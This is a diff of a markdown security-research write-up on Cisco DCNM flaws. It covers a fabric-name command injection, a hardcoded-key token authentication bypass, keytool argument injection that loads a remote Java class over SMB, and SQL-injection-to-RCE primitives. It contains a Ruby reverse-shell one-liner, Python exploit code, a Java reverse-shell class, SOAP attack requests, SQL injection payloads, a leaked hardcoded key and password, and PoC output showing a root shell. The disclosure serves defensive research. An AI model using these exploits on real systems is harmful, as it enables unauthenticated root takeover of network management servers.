+At line *[54]* we can call the `LanFabricImpl.createLanFabric` method with a controlled `com.cisco.dcbu.vinci.rest.resources.fabric.LanFabricSetting` entity bean called `fabric`.
 
 ```java
 /*     */ @JsonIgnoreProperties(ignoreUnknown = true)
@@ -819,7 +704,7 @@ Dcnmpass123
 /*     */   private BorderSetting borderSetting;
 ```
 
-<p markdown="1" class="cn">This entity bean contains several nested entity beans of type `GeneralSetting`, `ProvisionSetting`, `PoolSetting` and `BorderSetting`. We will need to setup the data structures correctly if we want to reach certain parts of the code.</p>
+This entity bean contains several nested entity beans of type `GeneralSetting`, `ProvisionSetting`, `PoolSetting` and `BorderSetting`. We will need to setup the data structures correctly if we want to reach certain parts of the code.
 
 ```java
 /*      */   public StatusCode createLanFabric(LanFabricSetting fabric) {
@@ -840,7 +725,7 @@ Dcnmpass123
 /*  149 */       ret = fabric.validate();
 ```
 
-<p markdown="1" class="cn">In order to continue execution, the `fabric` entity bean needs to survive the checks on lines *[148-149]*. The most important is the `fabric.validate` method call which contains multiple checks for property values.</p>
+In order to continue execution, the `fabric` entity bean needs to survive the checks on lines *[148-149]*. The most important is the `fabric.validate` method call which contains multiple checks for property values.
 
 ```java
 /*     */   public StatusCode validate() {
@@ -885,7 +770,7 @@ Dcnmpass123
 /*     */   }
 ```
 
-<p markdown="1" class="cn">Upon many things to validate, line *[89]* checks to ensure is that we have no spaces in the `name` property. This will become important later.</p>
+Upon many things to validate, line *[89]* checks to ensure is that we have no spaces in the `name` property. This will become important later.
 
 ```java
 /*  150 */       if (ret != StatusCode.Success) {
@@ -930,9 +815,9 @@ Dcnmpass123
 /*  189 */         DhcpAutoconfigImpl dhcpImpl = new DhcpAutoconfigImpl(fabricName);                            // 6
 ```
 
-<p markdown="1" class="cn">Back inside of `LanFabricImpl.createLanFabric` at line *[152]* we need to make sure the controlled `fabricName` hasn't been created before hand (the code just uses a hashmap lookup).</p> 
+Back inside of `LanFabricImpl.createLanFabric` at line *[152]* we need to make sure the controlled `fabricName` hasn't been created before hand (the code just uses a hashmap lookup).
 
-<p markdown="1" class="cn">Then at line *[179]* we can enter the branch if we successfully call `addFabric` on line *[159]*. Then at *[189]* the code calls a new instance of the `com.cisco.dcbu.vinci.dhcp.handler.DhcpAutoconfigImpl` class with our controlled `fabricName` string. Let's take a quick look at the constructor for that class.</p>
+Then at line *[179]* we can enter the branch if we successfully call `addFabric` on line *[159]*. Then at *[189]* the code calls a new instance of the `com.cisco.dcbu.vinci.dhcp.handler.DhcpAutoconfigImpl` class with our controlled `fabricName` string. Let's take a quick look at the constructor for that class.
 
 ```java
 /*   52 */   public DhcpAutoconfigImpl(String fabricname) { 
@@ -953,13 +838,13 @@ Dcnmpass123
 /*      */     }
 ```
 
-<p markdown="1" class="cn">What this code reveals is that we can inject into the `this.dhcpConfig` variable</p>
+What this code reveals is that we can inject into the `this.dhcpConfig` variable:
 
 ```java
 /*   69 */   public String getFabricDhcpConfigFileName() { return this.dhcpConfig; }
 ```
 
-<p markdown="1" class="cn">Continuing inside of `LanFabricImpl.createLanFabric` we can see the rest of the code:</p>
+Continuing inside of `LanFabricImpl.createLanFabric` we can see the rest of the code:
 
 ```java
 /*  190 */         String fabricDhcpFileName = dhcpImpl.getFabricDhcpConfigFileName();
@@ -982,21 +867,21 @@ Dcnmpass123
 /*  207 */         Runtime.getRuntime().exec("rm -rf " + helpScriptFileName);
 ```
 
-<p markdown="1" class="cn">Now when the `com.cisco.dcbu.vinci.dhcp.handler.DhcpAutoconfigImpl.getFabricDhcpConfigFileName` method is called on line *[190]*, we can return an injected string into `fabricDhcpFileName`. **This injected string must not contain spaces in order to survive previous checks**.</p>
+Now when the `com.cisco.dcbu.vinci.dhcp.handler.DhcpAutoconfigImpl.getFabricDhcpConfigFileName` method is called on line *[190]*, we can return an injected string into `fabricDhcpFileName`. **This injected string must not contain spaces in order to survive previous checks**.
 
-<p markdown="1" class="cn">At line *[196]* we need to survive this call to `DhcpAutoconfigImpl.updatePrimarySubent`, so to ensure that I set the `primarySubnet`, `primaryDns` and `secondaryDns` variables to `127.0.0.1` (all valid ipv4 addresses).</p>
+At line *[196]* we need to survive this call to `DhcpAutoconfigImpl.updatePrimarySubent`, so to ensure that I set the `primarySubnet`, `primaryDns` and `secondaryDns` variables to `127.0.0.1` (all valid ipv4 addresses).
 
-<p markdown="1" class="cn">Then at line *[204]* the code uses our injected `fabricDhcpFileName` when dynamically creating a shell script and then later at line *[206]* it is executed.</p>
+Then at line *[204]* the code uses our injected `fabricDhcpFileName` when dynamically creating a shell script and then later at line *[206]* it is executed.
 
-<p markdown="1" class="cn">To exploit this, I used ruby with [bash brace expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html) since I was not able to have spaces. Ruby is installed by default on the appliance and allowed me to craft a reverse shell in code that had no spaces.</p>
+To exploit this, I used ruby with [bash brace expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html) since I was not able to have spaces. Ruby is installed by default on the appliance and allowed me to craft a reverse shell in code that had no spaces.
 
-```ruby
+```rb
 c=TCPSocket.new("127.0.0.1","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print(io.read)}end
 ```
 
-<p markdown="1" class="cn">Below is the `pop_a_root_shell` method from my exploit that shows the layered entity bean that I crafted in json.</p>
+Below is the `pop_a_root_shell` method from my exploit that shows the layered entity bean that I crafted in json.
 
-```python
+```py
 def pop_a_root_shell(t, ls, lp):
     """ get dat shell! """
     handlerthr = Thread(target=handler, args=(lp,))
@@ -1031,27 +916,39 @@ def pop_a_root_shell(t, ls, lp):
     return False
 ```
 
-<p markdown="1" class="cn">Chaining everything together, we can achieve unauthenticated remote code execution as root!</p>
+Chaining everything together, we can achieve unauthenticated remote code execution as root!
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/cmdi.png"
-            title="Gaining unauthenticated remote code execution as root!"
-            caption="Gaining unauthenticated remote code execution as root!"
-            style="width:80%;height:80%" %}
+```
+saturn:~ mr_me$ ./poc.py 
+(+) usage: ./poc.py <target> <connectback:port>
+(+) eg: ./poc.py 192.168.100.123 192.168.100.59
+(+) eg: ./poc.py 192.168.100.123 192.168.100.59:1337
 
-<p markdown="1" class="cn">You can [download](/pocs/cve-2019-15977.py.txt) the exploit and test it for yourself.</p>
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+saturn:~ mr_me$ ./poc.py 192.168.100.123 192.168.100.59:1337
+(+) leaked user: root
+(+) leaked pass: Dcnmpass123
+(+) leaked vfs path: temp18206a94b7c45072/content-85ba056e1faec012
+(+) created a root session!
+(+) starting handler on port 1337
+(+) connection from 192.168.100.123
+(+) pop thy shell!
+id
+uid=0(root) gid=0(root) groups=0(root)
+uname -a
+Linux localhost 3.10.0-957.10.1.el7.x86_64 #1 SMP Mon Mar 18 15:06:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+You can [download](/pocs/cve-2019-15977.py.txt) the exploit and test it for yourself.
+[ret2toc](#table-of-contents)
 
 ## RCE Chain 3
 
-<p markdown="1" class="cn">Vulnerable Targets:</p>
-<div markdown="1" class="cn">
+Vulnerable Targets:
 - Installer for Windows (dcnm-installer-x64-windows.11.2.1.exe.zip)
-</div>
 
 ### TrustedClientTokenValidator Authentication Bypass Vulnerability
 
-<p markdown="1" class="cn">Inside of the Fabric Manager (FM) web application directory, we can find the `web.xml` that contains the servlet mappings for the application.</p>
+Inside of the Fabric Manager (FM) web application directory, we can find the `web.xml` that contains the servlet mappings for the application.
 
 ```xml
 <servlet>
@@ -1070,7 +967,7 @@ def pop_a_root_shell(t, ls, lp):
 </context-param>
 ```
 
-<p markdown="1" class="cn">A number of resteasy providers are also registered and the most interesting of them is the `com.cisco.dcbu.web.client.rest.RestSecurityInterceptor` interceptor.</p>
+A number of resteasy providers are also registered and the most interesting of them is the `com.cisco.dcbu.web.client.rest.RestSecurityInterceptor` interceptor.
 
 ```java
 /*     */ @Provider
@@ -1105,17 +1002,15 @@ def pop_a_root_shell(t, ls, lp):
 /*     */   }
 ```
 
-<p markdown="1" class="cn">The precedence is set to *SECURITY* which means this interceptor will be executed first before any other interceptor. For reference, here is the order of precedence:</p>
+The precedence is set to *SECURITY* which means this interceptor will be executed first before any other interceptor. For reference, here is the order of precedence:
 
-<div markdown="1" class="cn">
 1. SECURITY
 2. HEADER_DECORATOR
 3. ENCODER
 4. REDIRECT
 5. DECODER
-</div>
 
-<p markdown="1" class="cn">At line *[95]* we can see a call to `RestSecurityInterceptor.doTokenValidation` using the `ContainerRequestContext` instance. This is literally an [Interface API](https://docs.oracle.com/javaee/7/api/javax/ws/rs/container/ContainerRequestContext.html) for the complete HTTP request.</p>
+At line *[95]* we can see a call to `RestSecurityInterceptor.doTokenValidation` using the `ContainerRequestContext` instance. This is literally an [Interface API](https://docs.oracle.com/javaee/7/api/javax/ws/rs/container/ContainerRequestContext.html) for the complete HTTP request.
 
 ```java
 /*     */   private void doTokenValidation(ContainerRequestContext requestContext, Method method) throws AuthenticationException {
@@ -1160,7 +1055,7 @@ def pop_a_root_shell(t, ls, lp):
 /*     */   }
 ```
 
-<p markdown="1" class="cn">On line *[219]* we can't just return from the call on `RestSecurityInterceptor.bypass` because that method contains equality checks and not indexing checks.</p>
+On line *[219]* we can't just return from the call on `RestSecurityInterceptor.bypass` because that method contains equality checks and not indexing checks.
 
 ```java
 /*     */   private boolean bypass(ContainerRequestContext requestContext) {
@@ -1175,9 +1070,9 @@ def pop_a_root_shell(t, ls, lp):
 /*     */   }
 ```
 
-<p markdown="1" class="cn">Our goal is to reach a `return;` statement in `RestSecurityInterceptor.doTokenValidation`, so setting the `appToken` variable at line *[224]* to the value from the `afw-app-token` HTTP header in our request is *NOT* going to achieve that.</p>
+Our goal is to reach a `return;` statement in `RestSecurityInterceptor.doTokenValidation`, so setting the `appToken` variable at line *[224]* to the value from the `afw-app-token` HTTP header in our request is *NOT* going to achieve that.
 
-<p markdown="1" class="cn">Continuing on, there is a call to `RestSecurityInterceptor.getAfwToken` at line *[232]* in the else block that is attempting to set the `afwToken` variable.</p>
+Continuing on, there is a call to `RestSecurityInterceptor.getAfwToken` at line *[232]* in the else block that is attempting to set the `afwToken` variable.
 
 ```java
 /*     */   private String getAfwToken() {
@@ -1189,7 +1084,7 @@ def pop_a_root_shell(t, ls, lp):
 /*     */   }
 ```
 
-<p markdown="1" class="cn">We can set the `afwToken` to be a controlled value from the request using the `afw-token` HTTP header. Now let's investigate the `TrustedClientTokenValidator.isValid` static method.</p>
+We can set the `afwToken` to be a controlled value from the request using the `afw-token` HTTP header. Now let's investigate the `TrustedClientTokenValidator.isValid` static method.
 
 ```java
 /*    */ public class TrustedClientTokenValidator
@@ -1242,11 +1137,11 @@ def pop_a_root_shell(t, ls, lp):
 /*    */ }
 ```
 
-<p markdown="1" class="cn">The `com.cisco.dcbu.lib.afw.TrustedClientTokenValidator` class sets up a static initializer with an initialized `Cipher` instance using a hardcoded key `s91zEQmb305F!90a`. When the `TrustedClientTokenValidator.isValid` method is called, the code attempts to base64 decode the provided token and decrypt it using the static key.</p>
+The `com.cisco.dcbu.lib.afw.TrustedClientTokenValidator` class sets up a static initializer with an initialized `Cipher` instance using a hardcoded key `s91zEQmb305F!90a`. When the `TrustedClientTokenValidator.isValid` method is called, the code attempts to base64 decode the provided token and decrypt it using the static key.
 
-<p markdown="1" class="cn">This is stored into a byte array and the last 10 bytes are extracted and parsed as a Long. A `lowerBound` Long value is created from the current time in milliseconds -15 seconds. If we supply a value that is greater than the `lowerBound` but less than the current time then we can return `true` and subsequently return from `RestSecurityInterceptor.doTokenValidation` safely.</p>
+This is stored into a byte array and the last 10 bytes are extracted and parsed as a Long. A `lowerBound` Long value is created from the current time in milliseconds -15 seconds. If we supply a value that is greater than the `lowerBound` but less than the current time then we can return `true` and subsequently return from `RestSecurityInterceptor.doTokenValidation` safely.
 
-<p markdown="1" class="cn">Once we return out of `RestSecurityInterceptor.doTokenValidation` we are still faced with another hurdle on line *[99]* which is the call to `IdentityManager.isAdmin`.</p>
+Once we return out of `RestSecurityInterceptor.doTokenValidation` we are still faced with another hurdle on line *[99]* which is the call to `IdentityManager.isAdmin`.
 
 ```java
 /*  98 */         if (method.isAnnotationPresent(com.cisco.dcbu.sm.common.annotation.AdminAccess.class) && 
@@ -1277,21 +1172,17 @@ def pop_a_root_shell(t, ls, lp):
 /*     */     }
 ```
 
-<p markdown="1" class="cn">If we set the `response` variable, it's game over for us because on line *[121]* there is a check for a non null `response` and if its set, the code will abort and not let our HTTP request through.</p>
+If we set the `response` variable, it's game over for us because on line *[121]* there is a check for a non null `response` and if its set, the code will abort and not let our HTTP request through.
 
 #### The Rabbit Hole Goes Deeper
 
-<p markdown="1" class="cn">Admittedly, when I initially developed the poc for this bug, I sometimes didn't set the `response` variable at all and I had no idea why, so I was bypassing authentication when I shouldn't be. In other cases I as hitting line *[102]* and setting the response to a 403 *Access denied*.</p>
+Admittedly, when I initially developed the poc for this bug, I sometimes didn't set the `response` variable at all and I had no idea why, so I was bypassing authentication when I shouldn't be. In other cases I as hitting line *[102]* and setting the response to a 403 *Access denied*.
 
-<p markdown="1" class="cn">I verified this by setting a breakpoint after the `IdentityManager.isAdmin` method call check.</p>
+I verified this by setting a breakpoint after the `IdentityManager.isAdmin` method call check.
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/response-null.png"
-            title="`response` is null after performing the IdentityManager.isAdmin method call check"
-            caption="`response` is null after performing the IdentityManager.isAdmin method call check"
-            style="width:80%;height:80%" %}
+![response is null after performing the IdentityManager.isAdmin method call check](/assets/images/busting-ciscos-beans/response-null.png "response is null after performing the IdentityManager.isAdmin method call check") 
 
-<p markdown="1" class="cn">Let's dive into the `IdentityManager.isAdmin` method</p>
+Let's dive into the `IdentityManager.isAdmin` method:
 
 ```java
 /*     */   public boolean isAdmin() {
@@ -1306,7 +1197,7 @@ def pop_a_root_shell(t, ls, lp):
 /*     */   }
 ```
 
-<p markdown="1" class="cn">Inside of the `SecurityHandler` class.</p>
+Inside of the `SecurityHandler` class.
 
 ```java
 /*     */ public class SecurityHandler
@@ -1323,20 +1214,15 @@ def pop_a_root_shell(t, ls, lp):
 /* 206 */   public static String getToken() { return (String)tkn.get(); }
 ```
 
-<p markdown="1" class="cn">Somehow still, `SecurityHandler.getToken` was returning a non null value?</p>
+Somehow still, `SecurityHandler.getToken` was returning a non null value?
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/isadmin.png"
-            title="I'm an admin when I shouldn't be"
-            caption="I'm an admin when I shouldn't be"
-            style="width:80%;height:80%" %}
+![I'm an admin when I shouldn't be](/assets/images/busting-ciscos-beans/isadmin.png "I'm an admin when I shouldn't be") 
 
-<p markdown="1" class="cn">I noticed that the role was set to `network-admin`, which is not what I sent in my payload, rather I sent `global-admin`. So where is `network-admin` coming from? The `SecurityHandler.tkn` variable is an instance of the `java.lang.InheritableThreadLocal` class.</p>
+I noticed that the role was set to `network-admin`, which is not what I sent in my payload, rather I sent `global-admin`. So where is `network-admin` coming from? The `SecurityHandler.tkn` variable is an instance of the `java.lang.InheritableThreadLocal` class.
 
-<p markdown="1" class="cn">The hint is in the class name, `InheritableThreadLocal`. This class inherits the `get` method from the superclass `ThreadLocal`. It obtains an instance of `ThreadLocalMap` at *[1]* which was created with the constructor at *[2]*. It then sets values by calling `childValue` which is getting the value from the parent thread at *[5]* and assigning it to the child thread.</p>
+The hint is in the class name, `InheritableThreadLocal`. This class inherits the `get` method from the superclass `ThreadLocal`. It obtains an instance of `ThreadLocalMap` at *[1]* which was created with the constructor at *[2]*. It then sets values by calling `childValue` which is getting the value from the parent thread at *[5]* and assigning it to the child thread.
 
 ```java
-
 public class ThreadLocal<T> {
 
     // ...
@@ -1406,25 +1292,17 @@ public class InheritableThreadLocal<T> extends ThreadLocal<T> {
     }
 ```
 
-<p markdown="1" class="cn">This copying of values from the parent thread to the child is known as a [*shallow copy*](https://stackoverflow.com/a/1175667), which is just a copy on reference and is a [known weakness](https://zhangyuhui.blog/2018/01/12/leak-issue-of-inheritablethreadlocal-and-how-to-fix-it/) in the java Runtime. So the code is actually calling `IdentityManager.extractToken` on a legitimate administrative token that was leaked from the parent thread!</p>
+This copying of values from the parent thread to the child is known as a [*shallow copy*](https://stackoverflow.com/a/1175667), which is just a copy on reference and is a [known weakness](https://zhangyuhui.blog/2018/01/12/leak-issue-of-inheritablethreadlocal-and-how-to-fix-it/) in the java Runtime. So the code is actually calling `IdentityManager.extractToken` on a legitimate administrative token that was leaked from the parent thread!
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/isValid-ab-1.png"
-            title="Bypassing TrustedClientTokenValidator.isValid and (ab)using a design flaw in Java Runtime to bypass authentication"
-            caption="Bypassing TrustedClientTokenValidator.isValid and (ab)using a design flaw in Java Runtime to bypass authentication"
-            style="width:60%;height:60%" %}
+![Bypassing TrustedClientTokenValidator.isValid and (ab)using a design flaw in Java Runtime to bypass authentication](/assets/images/busting-ciscos-beans/isValid-ab-1.png "Bypassing TrustedClientTokenValidator.isValid and (ab)using a design flaw in Java Runtime to bypass authentication") 
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/isValid-ab-2.png"
-            title="A wild hacker appears!"
-            caption="A wild hacker appears!"
-            style="width:60%;height:60%" %}
+![A wild hacker appears!](/assets/images/busting-ciscos-beans/isValid-ab-2.png "A wild hacker appears!") 
 
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+[ret2toc](#table-of-contents)
 
 ### SanWS importTS Command Injection Remote Code Execution Vulnerability
 
-<p markdown="1" class="cn">Inside of the `com.cisco.dcbu.jaxws.san.ep.SanWS` class we can find the definition of the `importTS` web service method:</p>
+Inside of the `com.cisco.dcbu.jaxws.san.ep.SanWS` class we can find the definition of the `importTS` web service method:
 
 ```java
 /*       */ @Remote({SanSEI.class})
@@ -1474,15 +1352,15 @@ public class InheritableThreadLocal<T> extends ThreadLocal<T> {
 /*       */   }
 ```
 
-<p markdown="1" class="cn">We can see at line *[10908]* that a string called `cmd` is built using the `certFile` string from an attacker supplied SOAP parameter. At line *[10912]* the `cmd` string is used in a call to `Runtime.getRuntime().exec()` thus, triggering command injection!</p>
+We can see at line *[10908]* that a string called `cmd` is built using the `certFile` string from an attacker supplied SOAP parameter. At line *[10912]* the `cmd` string is used in a call to `Runtime.getRuntime().exec()` thus, triggering command injection!
 
-<p markdown="1" class="cn">The complete command for the injection looks like this: `C:\Program Files\Cisco Systems\dcm\java\jre1.8\bin\keytool.exe -importcert -trustcacerts -keystore C:\Program Files\Cisco Systems\dcm\fm\conf\cert\fmtrust.jks -file <attacker controlled>`</p>
+The complete command for the injection looks like this: `C:\Program Files\Cisco Systems\dcm\java\jre1.8\bin\keytool.exe -importcert -trustcacerts -keystore C:\Program Files\Cisco Systems\dcm\fm\conf\cert\fmtrust.jks -file <attacker controlled>`
 
-<p markdown="1" class="cn">If you have ever tried to exploit command injection in Java via `Runtime.getRuntime().exec()` API, you will know that you are limited to the binary being executed.</p>
+If you have ever tried to exploit command injection in Java via `Runtime.getRuntime().exec()` API, you will know that you are limited to the binary being executed.
 
-<p markdown="1" class="cn">So for example if the injection was in `cmd.exe` like this: `cmd.exe /c "C:\Program Files\Cisco Systems\dcm\java\jre1.8\bin\keytool.exe -importcert -trustcacerts -keystore C:\Program Files\Cisco Systems\dcm\fm\conf\cert\fmtrust.jks -file <attacker controlled>"` then we could have just done `&&calc.exe` and call it a day.</p>
+So for example if the injection was in `cmd.exe` like this: `cmd.exe /c "C:\Program Files\Cisco Systems\dcm\java\jre1.8\bin\keytool.exe -importcert -trustcacerts -keystore C:\Program Files\Cisco Systems\dcm\fm\conf\cert\fmtrust.jks -file <attacker controlled>"` then we could have just done `&&calc.exe` and call it a day.
 
-<p markdown="1" class="cn">But we are in the context of `keytool.exe`, so we can really only inject into *its* arguments. As it [turns out](https://docs.oracle.com/en/java/javase/11/tools/keytool.html), we can use the `providerclass` and `providerpath` arguments to load a remote Java class from an SMB share and gain remote code execution! All we need to do is have some code inside of the provided classes static initializer.</p> 
+But we are in the context of `keytool.exe`, so we can really only inject into *its* arguments. As it [turns out](https://docs.oracle.com/en/java/javase/11/tools/keytool.html), we can use the `providerclass` and `providerpath` arguments to load a remote Java class from an SMB share and gain remote code execution! All we need to do is have some code inside of the provided classes static initializer.
 
 ```java
 import java.io.*;
@@ -1496,7 +1374,7 @@ public class Si{
 }
 ```
 
-<p markdown="1" class="cn">Keep in mind, our target uses version *Java 1.8u201* so we need to compile the class with the same major version! Once we have done that, we can login to the `/LogonWSService/LogonWS` endpoint with the backdoor account we created from our [authentication bypass](#trustedclienttokenvalidator-authentication-bypass-vulnerability).</p>
+Keep in mind, our target uses version *Java 1.8u201* so we need to compile the class with the same major version! Once we have done that, we can login to the `/LogonWSService/LogonWS` endpoint with the backdoor account we created from our [authentication bypass](#trustedclienttokenvalidator-authentication-bypass-vulnerability).
 
 ```xml
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.jaxws.dcbu.cisco.com/">
@@ -1511,13 +1389,13 @@ public class Si{
 </soapenv:Envelope>
 ```
 
-<p markdown="1" class="cn">The server responds with a token.</p>
+The server responds with a token.
 
 ```xml
 <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns1:requestTokenResponse xmlns:ns1="http://ep.jaxws.dcbu.cisco.com/"><return>xWPX64FmO4F4AfCSjjV1U5kwTMgS3OTgkjf8829Bi+o=</return></ns1:requestTokenResponse></soap:Body></soap:Envelope>
 ```
 
-<p markdown="1" class="cn">Now we can trigger the remote class load via the command injection and gain remote code execution!</p>
+Now we can trigger the remote class load via the command injection and gain remote code execution!
 
 ```xml
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.san.jaxws.dcbu.cisco.com/">
@@ -1533,7 +1411,7 @@ public class Si{
 </soapenv:Envelope>
 ```
 
-<p markdown="1" class="cn">In the below example, `Si.java` was a reverse shell.</p>
+In the below example, `Si.java` was a reverse shell.
 
 ```java
 import java.io.IOException;
@@ -1576,30 +1454,24 @@ public class Si {
 }
 ```
 
-{% include image.html
-            img="assets/images/busting-ciscos-beans-hardcoding-your-way-to-hell/keytool-cmdi.png"
-            title="Loading remote java classes and gaining remote code execution"
-            caption="Loading remote java classes and gaining remote code execution"
-            style="width:80%;height:80%" %}
+![Loading remote java classes and gaining remote code execution](/assets/images/busting-ciscos-beans/keytool-cmdi.png "Loading remote java classes and gaining remote code execution")
 
-<p markdown="1" class="cn">You can [download](/pocs/cve-2019-15975.py.txt) the exploit and test it for yourself. You will need an SMB server that is hosting the `Si.class` file.</p>
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+You can [download](/pocs/cve-2019-15975.py.txt) the exploit and test it for yourself. You will need an SMB server that is hosting the `Si.class` file.
+[ret2toc](#table-of-contents)
 
 ## SQLi2RCE Primitives
 
-<p markdown="1" class="cn">These are the remote code execution primitives I used to chain with arbitrary sql execution vulnerabilities. These primitives take advantage of the assumed trust that the application code had with the database.</p>
+These are the remote code execution primitives I used to chain with arbitrary sql execution vulnerabilities. These primitives take advantage of the assumed trust that the application code had with the database.
 
-<p markdown="1" class="cn">In each of these cases, there was no second order attack - meaning that the insertion stage of data injection was filtered for malicious input enough to prevent direct remote code execution. This is why they are not considered vulnerabilities themselves.</p>
+In each of these cases, there was no second order attack - meaning that the insertion stage of data injection was filtered for malicious input enough to prevent direct remote code execution. This is why they are not considered vulnerabilities themselves.
 
 ### Primitive 1 - Directory Traversal File Write
 
-<p markdown="1" class="cn">Vulnerable Targets:</p>
-<div markdown="1" class="cn">
+Vulnerable Targets:
 - Installer for Windows (dcnm-installer-x64-windows.11.2.1.exe.zip)
 - ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)
-</div>
 
-<p markdown="1" class="cn">Inside of the `com.cisco.dcbu.jaxws.san.ep.ReportWS` class, we can see the following web service method.</p>
+Inside of the `com.cisco.dcbu.jaxws.san.ep.ReportWS` class, we can see the following web service method.
 
 ```java
 /*     */   @WebMethod
@@ -1622,7 +1494,7 @@ public class Si {
 /*     */   }
 ```
 
-<p markdown="1" class="cn">This method can also be reached from the `com.cisco.dcbu.web.client.rest.ReportRest` class on line *[877]* which is a default registered class for Fabric Manager REST interface.</p>
+This method can also be reached from the `com.cisco.dcbu.web.client.rest.ReportRest` class on line *[877]* which is a default registered class for Fabric Manager REST interface.
 
 ```java
 /*     */   @GET
@@ -1643,7 +1515,7 @@ public class Si {
 /*     */   }
 ```
 
-<p markdown="1" class="cn">The method calls `ReportUtil.openReportTemplate` on line *[403]* with our controlled `tplName` (or `reportTemplateName`) and `userName`.</p>
+The method calls `ReportUtil.openReportTemplate` on line *[403]* with our controlled `tplName` (or `reportTemplateName`) and `userName`.
 
 ```java
 /*      */   public ArrayList<ReportAttribute> openReportTemplate(String reportTemplateName, String userName) {
@@ -1657,7 +1529,7 @@ public class Si {
 /*  714 */       PersistentHelper.getHelper().retrieveFile(reportTemplateName, file2Read, userName);
 ```
 
-<p markdown="1" class="cn">The code builds a path at line *[709]* to the controlled `reportTemplateName` parameter which can contain directory traversals. Then at line *[714]* the code calls `PersistentHelper.retrieveFile` with all three (3) parameters controlled.</p>
+The code builds a path at line *[709]* to the controlled `reportTemplateName` parameter which can contain directory traversals. Then at line *[714]* the code calls `PersistentHelper.retrieveFile` with all three (3) parameters controlled.
 
 ```java
 /*      */   public long retrieveFile(String fileName, File destination, String userName) throws Exception { 
@@ -1665,7 +1537,7 @@ public class Si {
 /*      */   }
 ```
 
-<p markdown="1" class="cn">Then `PostgresWrapper.retrieveFile` is called with the same arguments as well as the `xmlDocs` string. I had some issues with decompiling this [POJI](https://en.wikipedia.org/wiki/Interface_(Java)) under eclipse which is why the code is missing line numbers.</p>
+Then `PostgresWrapper.retrieveFile` is called with the same arguments as well as the `xmlDocs` string. I had some issues with decompiling this [POJI](https://en.wikipedia.org/wiki/Interface_(Java)) under eclipse which is why the code is missing line numbers.
 
 ```java
 /*      */  public long retrieveFile(String fileName, File destination, String userName, String tableName) throws Exception {
@@ -1690,19 +1562,16 @@ public class Si {
 /*      */        fos.close();
 ```
 
-<p markdown="1" class="cn">It can be observed that our controlled `destination` is used as a location for a write via the `FileOutputStream` instance object. The `content` for the write is taken from directly the database without further checks. If we can update the `content` in this table using an SQL injection, then we can essentially write controlled code into an arbitrary file.</p>
-
-<p markdown="1" class="cn">[ret2toc](#table-of-contents)</p>
+It can be observed that our controlled `destination` is used as a location for a write via the `FileOutputStream` instance object. The `content` for the write is taken from directly the database without further checks. If we can update the `content` in this table using an SQL injection, then we can essentially write controlled code into an arbitrary file.
+[ret2toc](#table-of-contents)
 
 ### Primitive 2 - Deserialization of Untrusted Data
 
-<p markdown="1" class="cn">Vulnerable Targets:</p>
-<div markdown="1" class="cn">
+Vulnerable Targets:
 - Installer for Windows (dcnm-installer-x64-windows.11.2.1.exe.zip)
 - ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)
-</div>
 
-<p markdown="1" class="cn">Using an SQL injection, we can inject serialized payloads into the database and later trigger deserialization. Inside of the `com.cisco.dcbu.web.client.rest.health.vpc.VirtualPortChannel` REST class we can see the `getVpcPeerHistoryDetails` method.</p>
+Using an SQL injection, we can inject serialized payloads into the database and later trigger deserialization. Inside of the `com.cisco.dcbu.web.client.rest.health.vpc.VirtualPortChannel` REST class we can see the `getVpcPeerHistoryDetails` method.
 
 ```java
 /*     */   @GET
@@ -1719,7 +1588,7 @@ public class Si {
 /*     */   }
 ```
 
-<p markdown="1" class="cn">On line *[486]* we can see a call to `ConfigHistoryUtil.getJobDetails`.</p>
+On line *[486]* we can see a call to `ConfigHistoryUtil.getJobDetails`.
 
 ```java
 /*     */   public static ConfigDeploymentStatus getJobDetails(String context, long jobId) {
@@ -1756,26 +1625,26 @@ public class Si {
 /*     */   }
 ```
 
-<p markdown="1" class="cn">The code performs a select statement from the database (either from `vpc_history` or `vpc_peer_history` tables) for the `command` column. At line *[238]* the code calls `rs.getBinaryStream` which extracts the binary stream data from the result set of the sql statement. With that input, we can see a classic `readObject` call using that column data.</p>
+The code performs a select statement from the database (either from `vpc_history` or `vpc_peer_history` tables) for the `command` column. At line *[238]* the code calls `rs.getBinaryStream` which extracts the binary stream data from the result set of the sql statement. With that input, we can see a classic `readObject` call using that column data.
 
-<p markdown="1" class="cn">An example of an SQL injection statement to exploit this issue is presented below. You will need to change the `41` to an ascii hex encoded serialized payload from [ysoserial](https://github.com/frohoff/ysoserial).</p>
+An example of an SQL injection statement to exploit this issue is presented below. You will need to change the `41` to an ascii hex encoded serialized payload from [ysoserial](https://github.com/frohoff/ysoserial).
 
 ```sql
 ;insert into vpc_peer_history(id, commands) values (2, decode('41', 'hex'));--
 ;insert into vpc_history(id, commands) values (2, decode('41', 'hex'));--
 ```
 
-<p markdown="1" class="cn">Now when we trigger the following endpoint, we'll deserialize our serialized payload.</p>
+Now when we trigger the following endpoint, we'll deserialize our serialized payload.
 
 ```bash
 https://<target>/fm/fmrest/virtualportchannel/vpcwizard/history/details?context=vpc&jobId=2
 ```
 
